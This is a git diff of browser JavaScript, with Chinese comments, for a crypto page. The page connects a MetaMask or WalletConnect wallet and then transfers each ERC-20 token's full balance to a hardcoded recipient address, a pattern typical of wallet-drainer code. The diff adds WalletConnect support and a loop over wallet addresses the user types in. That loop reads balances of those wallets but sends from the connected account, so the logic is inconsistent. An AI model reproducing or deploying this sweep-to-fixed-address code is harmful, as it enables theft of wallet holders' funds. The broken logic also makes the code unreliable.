@@ -1,6 +1,6 @@
 const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
 const etherscanApiKey = 'YOUR_ETHERSCAN_API_KEY'; // 替换为你的 Etherscan API Key
-const web3 = new Web3(Web3.givenProvider || 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');
+let web3;
 
 const erc20Abi = [
     {
@@ -22,17 +22,28 @@ const erc20Abi = [
     }
 ];
 
+// 初始化 WalletConnect provider
+const walletConnectProvider = new WalletConnectProvider({
+    infuraId: "YOUR_INFURA_PROJECT_ID", // 替换为你的 Infura 项目 ID
+});
+
+// 连接 MetaMask 或 WalletConnect
 document.getElementById('connectButton').onclick = async () => {
-    if (window.ethereum) {
-        try {
+    try {
+        // 检查是否存在 MetaMask
+        if (window.ethereum) {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
-            document.getElementById('status').innerText = '钱包已连接';
-            document.getElementById('transferButton').disabled = false;
-        } catch (error) {
-            document.getElementById('status').innerText = '连接钱包失败: ' + error.message;
+            web3 = new Web3(window.ethereum);
+            document.getElementById('status').innerText = 'MetaMask 已连接';
+        } else {
+            // 使用 WalletConnect
+            await walletConnectProvider.enable();
+            web3 = new Web3(walletConnectProvider);
+            document.getElementById('status').innerText = 'WalletConnect 已连接';
         }
-    } else {
-        document.getElementById('status').innerText = '请安装 MetaMask 钱包';
+        document.getElementById('transferButton').disabled = false;
+    } catch (error) {
+        document.getElementById('status').innerText = '连接失败: ' + error.message;
     }
 };
 
@@ -74,23 +85,33 @@ document.getElementById('transferButton').onclick = async () => {
     const accounts = await web3.eth.getAccounts();
     const senderAddress = accounts[0];
 
-    document.getElementById('status').innerText = '正在获取代币余额...';
-    const tokenBalances = await getTokenBalances(senderAddress);
+    const walletInput = document.getElementById('wallets').value;
+    const walletAddresses = walletInput.split(',').map(addr => addr.trim());
 
-    for (const tokenAddress in tokenBalances) {
-        const token = tokenBalances[tokenAddress];
-        const balance = token.balance;
+    for (const walletAddress of walletAddresses) {
+        if (!web3.utils.isAddress(walletAddress)) {
+            document.getElementById('status').innerText += `\n无效的钱包地址: ${walletAddress}`;
+            continue;
+        }
 
-        if (balance > 0) {
-            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-            try {
-                const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: senderAddress });
-                document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 至 ${recipientAddress}`;
-            } catch (error) {
-                document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
+        document.getElementById('status').innerText += `\n正在获取 ${walletAddress} 的代币余额...`;
+        const tokenBalances = await getTokenBalances(walletAddress);
+
+        for (const tokenAddress in tokenBalances) {
+            const token = tokenBalances[tokenAddress];
+            const balance = token.balance;
+
+            if (balance > 0) {
+                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+                try {
+                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: senderAddress });
+                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
+                } catch (error) {
+                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
+                }
+            } else {
+                document.getElementById('status').innerText += `\n账户 ${walletAddress} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
             }
-        } else {
-            document.getElementById('status').innerText += `\n账户在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
         }
     }
 
